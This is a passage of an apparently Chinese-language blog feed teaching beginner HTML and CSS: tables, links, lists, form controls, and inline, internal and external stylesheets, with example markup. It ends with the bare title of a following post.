<h3 id="1-5-3th标签"><a href="#1-5-3th标签" class="headerlink" title="1.5.3th标签"></a>1.5.3th标签</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>th<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1px&quot;</span> <span class="attr">width</span>=<span class="string">&quot;300px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;200px&quot;</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">td</span>&gt;</span>编号<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">td</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">td</span>&gt;</span>薪资<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">td</span>&gt;</span>1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">td</span>&gt;</span>king<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">td</span>&gt;</span>5k<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">			<span class="comment">&lt;!--th可以代替td单元格，自动加粗自动居中--&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">th</span>&gt;</span>2<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">th</span>&gt;</span>leo<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">th</span>&gt;</span>4k<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/21/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%EF%BC%88html-css)/image-20220210164203463.png" alt="image-20220210164203463"></p>
<h3 id="1-5-4-thead-tbody-tfoot"><a href="#1-5-4-thead-tbody-tfoot" class="headerlink" title="1.5.4 thead tbody tfoot"></a>1.5.4 thead tbody tfoot</h3><p>表格可以使用thead tbody tfoot这三个标签分成三部分，方便日后的JavaScript。</p>
<p>这三个不是独目标签。</p>
<h2 id="1-6-背景和图片"><a href="#1-6-背景和图片" class="headerlink" title="1.6 背景和图片"></a>1.6 背景和图片</h2><h3 id="1-6-1背景颜色"><a href="#1-6-1背景颜色" class="headerlink" title="1.6.1背景颜色"></a>1.6.1背景颜色</h3><p>在body标签中加入属性bgcolor=”red”就是红色的背景</p>
<h3 id="1-6-2背景图片和网页元素"><a href="#1-6-2背景图片和网页元素" class="headerlink" title="1.6.2背景图片和网页元素"></a>1.6.2背景图片和网页元素</h3><p>而background=”图片路径（相对）”设置背景图片</p>
<p><code>&lt;img src=&quot;&quot;/&gt;</code>标签就是一个网页中的图片元素(如果开始标签和结束标签之间没有内容的话，那么我们可以直接在末尾加斜杠。)</p>
<p>width属性设置宽度，高度会等比例缩放</p>
<p>img的title属性设置图片描述（就是鼠标悬停时的提示信息）</p>
<p>img的alt属性用来指定当前图片加载失败时候的提示信息。</p>
<h2 id="1-7-超链接"><a href="#1-7-超链接" class="headerlink" title="1.7 超链接"></a>1.7 超链接</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>超链接<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--这是一个到百度的超链接--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.baidu.com&quot;</span>&gt;</span>百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--当然除了远程连接，也可以是本地的连接--&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--超链接的特点，自动添加下划线--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.4399.com&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./images/moca.png&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/21/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%EF%BC%88html-css)/image-20220210182515558.png" alt="image-20220210182515558"></p>
<p>在a标签中加入img标签也可以将他变成一个超链接。</p>
<h3 id="1-7-1-targe属性"><a href="#1-7-1-targe属性" class="headerlink" title="1.7.1 targe属性"></a>1.7.1 targe属性</h3><p>超链接的target属性，可以用来设置超链接打开的位置，默认是当前窗口。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_self 当前窗口</span><br><span class="line">_blank 新窗口</span><br><span class="line">_parent 当前窗口的父窗口</span><br><span class="line">_top 当前窗口的顶级窗口</span><br></pre></td></tr></table></figure>

<h3 id="1-7-2-iframe标签"><a href="#1-7-2-iframe标签" class="headerlink" title="1.7.2 iframe标签"></a>1.7.2 iframe标签</h3><p>iframe标签，可以创建一个窗口中的内部窗口。用其中的src属性来设置连接。</p>
<p><img src="/2022/02/21/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%EF%BC%88html-css)/image-20220210183117219.png" alt="image-20220210183117219"></p>
<p>就像这样一样。</p>
<h2 id="1-8-w3c以及BS结构原理"><a href="#1-8-w3c以及BS结构原理" class="headerlink" title="1.8 w3c以及BS结构原理"></a>1.8 w3c以及BS结构原理</h2><h3 id="1-8-1-w3c组织"><a href="#1-8-1-w3c组织" class="headerlink" title="1.8.1 w3c组织"></a>1.8.1 w3c组织</h3><p>W3C组织是对网络标准制定的一个非盈利组织，W3C是World Wide Web Consortium（万维网联盟）的缩写，像HTML、XHTML、CSS、XML的标准就是由W3C来定制。</p>
<h3 id="1-8-2-B-S架构的原理"><a href="#1-8-2-B-S架构的原理" class="headerlink" title="1.8.2 B/S架构的原理"></a>1.8.2 B/S架构的原理</h3><p>这里粗略的描述一下，其实就是我之前那篇《web入门》博文中提到的请求/响应模式。</p>
<p>第一步：用户在浏览器地址栏上输入URL</p>
<p>第二步：通过浏览器发送了一个请求</p>
<p>第三步：服务器会给浏览器一个响应，最终响应一段HTML代码给浏览器，展示结果。</p>
<h2 id="1-9-列表"><a href="#1-9-列表" class="headerlink" title="1.9 列表"></a>1.9 列表</h2><h3 id="1-9-1-无序列表"><a href="#1-9-1-无序列表" class="headerlink" title="1.9.1 无序列表"></a>1.9.1 无序列表</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>列表<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--无序列表--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--列表项里面同样可以嵌套一个列表--&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">li</span>&gt;</span>中国</span><br><span class="line">				<span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="comment">&lt;!--可以用type属性改变前面的段落标记--&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">li</span>&gt;</span>北京<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">li</span>&gt;</span>上海<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">li</span>&gt;</span>美国<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">li</span>&gt;</span>英国<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">li</span>&gt;</span>俄国<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/21/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%EF%BC%88html-css)/image-20220210194841345.png" alt="image-20220210194841345"></p>
<h3 id="1-9-2-有序列表"><a href="#1-9-2-有序列表" class="headerlink" title="1.9.2 有序列表"></a>1.9.2 有序列表</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>有序列表<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--列表项里面同样可以嵌套一个列表--&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">li</span>&gt;</span>水果</span><br><span class="line">				<span class="tag">&lt;<span class="name">ol</span>&gt;</span><span class="comment">&lt;!--可以用type属性改变前面的段落标记--&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">li</span>&gt;</span>香蕉<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">li</span>&gt;</span>樱桃<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">li</span>&gt;</span>蔬菜<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">li</span>&gt;</span>粗粮<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/21/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%EF%BC%88html-css)/image-20220210195044241.png" alt="image-20220210195044241"></p>
<h2 id="1-10-表单"><a href="#1-10-表单" class="headerlink" title="1.10 表单"></a>1.10 表单</h2><p>1.什么是表单，有什么用？</p>
<p>表单是用来收集用户数据的。</p>
<p><img src="/2022/02/21/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%EF%BC%88html-css)/image-20220210195948585.png" alt="image-20220210195948585"></p>
<p>像这样的就是表单。</p>
<p>第二个作用就是发送请求并且携带数据给服务器。</p>
<p>表单的英文是form</p>
<p>2.如何定义</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">	</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>3.他里面有一个action属性，需要添加url。</p>
<p>当然可以在表单中创建一个按钮</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;发送&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果要提交表单其type必须是submit，button是不能提交表单的。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>表单<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--表单--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://www.baidu.com&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;发送&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="1-10-1-表单提数据格式（以及一些表单中常用的输入模式）"><a href="#1-10-1-表单提数据格式（以及一些表单中常用的输入模式）" class="headerlink" title="1.10.1 表单提数据格式（以及一些表单中常用的输入模式）"></a>1.10.1 表单提数据格式（以及一些表单中常用的输入模式）</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>表单<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--表单,其中有个文本框和一个密码框--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://127.0.0.1&quot;</span>&gt;</span></span><br><span class="line">			用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>/&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">			密码:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;登录&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>表单最终提交的时候，有name属性的才会提交，没有name就不会提交。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">radio类型的input标签是单选框，同一组的单选框的name属性需要一致，一般value是0与1.</span><br><span class="line"></span><br><span class="line">checkbox类型的input标签则是复选框，一般value则是对应的选项。</span><br><span class="line"></span><br><span class="line">reset类型的input标签则是重置按钮。必须放在表单内部</span><br><span class="line"></span><br><span class="line">select标签则是下拉列表，其中用option标签来添加里面的选项，如果加上multiple属性，则表示下拉列表支持多选。size则是设置下拉列表一次最多选择条目数量。</span><br><span class="line"></span><br><span class="line">textarea标签则是一个文本域，相当于一个大的文本框，用row和cols来指定行和列。</span><br><span class="line"></span><br><span class="line">input标签中的maxlength属性则是最大输入字符的意思。</span><br><span class="line"></span><br><span class="line">注意，submit类型的name属性是不能有数值的。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>表单提交的时候，会默认以get形式传输出去。</p>
<h3 id="1-10-2-file-hidden控件"><a href="#1-10-2-file-hidden控件" class="headerlink" title="1.10.2 file hidden控件"></a>1.10.2 file hidden控件</h3><p>file类型的input标签，则可以选择文件。主要用于上传文件。</p>
<p>hidden类型的input标签，则可以创建一个隐藏域（浏览器上面看不到）。</p>
<h3 id="1-10-3-readonly和disabled"><a href="#1-10-3-readonly和disabled" class="headerlink" title="1.10.3 readonly和disabled"></a>1.10.3 readonly和disabled</h3><p>如果给一个输入框加上disabled和readonly，那么都是只读模式，但是这两个中只有readonly会提交给服务器，而disabled不会提交给服务器。</p>
<h2 id="1-11-html元素的id属性"><a href="#1-11-html元素的id属性" class="headerlink" title="1.11 html元素的id属性"></a>1.11 html元素的id属性</h2><p>在html中任何一个节点上都有id属性，id属性在同一个网页中是不能重复的。</p>
<p>id是这个节点的身份证号</p>
<p>这个id属性是方便JavaScript的一个属性，因为后期要对节点进行增删改，而增删改的时候需要获取到该节点。id就是方便我们获取到该节点。</p>
<h2 id="1-12-div和span"><a href="#1-12-div和span" class="headerlink" title="1.12 div和span"></a>1.12 div和span</h2><p>div和span都是图层，他们的布局更加灵活。</p>
<p>每一个div和span左上角的顶尖，都有x和y轴的坐标，通过这个我们定位每一个图片盒子。</p>
<p>后面的css会讲述如何定位。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">div和span有什么区别？</span><br><span class="line">dib默认情况独自占用一行。</span><br><span class="line">span不会独占行。</span><br></pre></td></tr></table></figure>

<p>div和span同样也可以进行嵌套。</p>
<h1 id="2-CSS"><a href="#2-CSS" class="headerlink" title="2. CSS"></a>2. CSS</h1><h2 id="2-1-初识css"><a href="#2-1-初识css" class="headerlink" title="2.1 初识css"></a>2.1 初识css</h2><p>1.cascading style sheet   层叠样式表语言</p>
<p>css其实是专门用来修饰html的，让html更好看。</p>
<p>2.css是为html服务的，主体依然是html，所以进行css的开发，我们依然需要创建一个 html/htm 文件</p>
<p>3.如何在html中嵌入css样式呢？三种方式</p>
<p>第一种：内联定义</p>
<p>第二种：定义内部样式块对象</p>
<p>第三种：链入外部样式表文件。</p>
<h3 id="2-1-1css手册"><a href="#2-1-1css手册" class="headerlink" title="2.1.1css手册"></a>2.1.1css手册</h3><p><a href="https://www.w3school.com.cn/cssref/index.asp">CSS 参考手册 (w3school.com.cn)</a></p>
<h2 id="2-2-内联定义方式"><a href="#2-2-内联定义方式" class="headerlink" title="2.2 内联定义方式"></a>2.2 内联定义方式</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&#x27;utf-8&#x27;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>html中嵌入css之内联定义<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	</span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span> <span class="attr">style</span>=<span class="string">&#x27;&#x27;</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--内联定义方式</span></span><br><span class="line"><span class="comment">	&lt;标签 style=&#x27;样式名 : 样式值；样式名 : 样式值;&#x27;&gt;</span></span><br><span class="line"><span class="comment">	&lt;/标签&gt;</span></span><br><span class="line"><span class="comment">	--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;div1&#x27;</span> <span class="attr">style</span>=<span class="string">&#x27;background-color:#00ff00;</span></span></span><br><span class="line"><span class="string"><span class="tag">		 height:100px;</span></span></span><br><span class="line"><span class="string"><span class="tag">		 width:100px;&#x27;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在标签中的style属性中进行定义，具体可以查阅css参考手册</p>
<p><img src="/2022/02/21/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%EF%BC%88html-css)/image-20220211143950479.png" alt="image-20220211143950479"></p>
<h2 id="2-3-定义内部样式块对象"><a href="#2-3-定义内部样式块对象" class="headerlink" title="2.3 定义内部样式块对象"></a>2.3 定义内部样式块对象</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&#x27;utf-8&#x27;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>html中嵌入css之定义内部样式块对象<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">		<span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span> =<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">		<span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="css">			这是css中的注释</span></span></span><br><span class="line"><span class="comment"><span class="css">			定义的方法就是</span></span></span><br><span class="line"><span class="comment"><span class="css">				选择器 &#123;</span></span></span><br><span class="line"><span class="comment"><span class="css">					样式名:样式值;</span></span></span><br><span class="line"><span class="comment"><span class="css">					样式名:样式值;</span></span></span><br><span class="line"><span class="comment"><span class="css">					样式名:样式值;</span></span></span><br><span class="line"><span class="comment"><span class="css">					样式名:样式值;</span></span></span><br><span class="line"><span class="comment"><span class="css">				&#125;</span></span></span><br><span class="line"><span class="comment"><span class="css">				</span></span></span><br><span class="line"><span class="comment"><span class="css">		css中最常见的选择器，id选择器，标签选择器，class选择器</span></span></span><br><span class="line"><span class="comment"><span class="css">		*/</span></span></span><br><span class="line"><span class="css">		<span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="css">		标签选择器，标签名&#123;</span></span></span><br><span class="line"><span class="comment"><span class="css">		</span></span></span><br><span class="line"><span class="comment"><span class="css">		&#125;</span></span></span><br><span class="line"><span class="comment"><span class="css">		*/</span></span></span><br><span class="line"><span class="css">		<span class="selector-tag">div</span>&#123;</span></span><br><span class="line"><span class="css">		<span class="attribute">background-color</span>:<span class="number">#00ff00</span>;</span></span><br><span class="line"><span class="css">		<span class="attribute">border-style</span>:solid;</span></span><br><span class="line"><span class="css">		<span class="attribute">border-color</span>:<span class="number">#ff0000</span> <span class="number">#0000ff</span>;</span></span><br><span class="line"><span class="css">		&#125;</span></span><br><span class="line"><span class="css">		</span></span><br><span class="line"><span class="css">		</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	</span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span> <span class="attr">style</span>=<span class="string">&#x27;&#x27;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/21/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%EF%BC%88html-css)/image-20220211145519383.png" alt="image-20220211145519383"></p>
<p>这样的话所有的div都会被修饰，如果想单独对某一个标签进行修饰，我们可以使用id选择器<code>id&#123;   &#125;</code></p>
<p>class属性，任何一个标签都有而且可以重复所以我们可用类选择器来指定某些元素进行修饰。</p>
<h2 id="2-4-链入外部样式表文件"><a href="#2-4-链入外部样式表文件" class="headerlink" title="2.4 链入外部样式表文件"></a>2.4 链入外部样式表文件</h2><p>1.css文件</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#div1</span> &#123;</span><br><span class="line">	<span class="attribute">background-color</span>: <span class="number">#FF0000</span>;</span><br><span class="line">	<span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">	<span class="attribute">height</span>:<span class="number">100px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实例.html文件</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&#x27;utf-8&#x27;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>链入外部样式表文件<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">		<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span> =<span class="string">&#x27;stylesheet&#x27;</span> <span class="attr">type</span>=<span class="string">&#x27;text/css&#x27;</span> <span class="attr">href</span>=<span class="string">&#x27;1.css&#x27;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	</span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;div1&#x27;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在头部的时候用link标签来引用我们的外部修饰。值得注意的是，前面的rel属性和type属性都是固定写法，后面的href用来指定文件的路径。</p>
<p><img src="/2022/02/21/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%EF%BC%88html-css)/image-20220211163402990.png" alt="image-20220211163402990"></p>
<h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
      <categories>
        <category>-basic</category>
      </categories>
  </entry>
  <entry>
    <title>可变变量 {}代替[] eval</title>
    <url>/2021/12/27/%E5%8F%AF%E5%8F%98%E5%8F%98%E9%87%8F-%E4%BB%A3%E6%9B%BF-eval/</url>
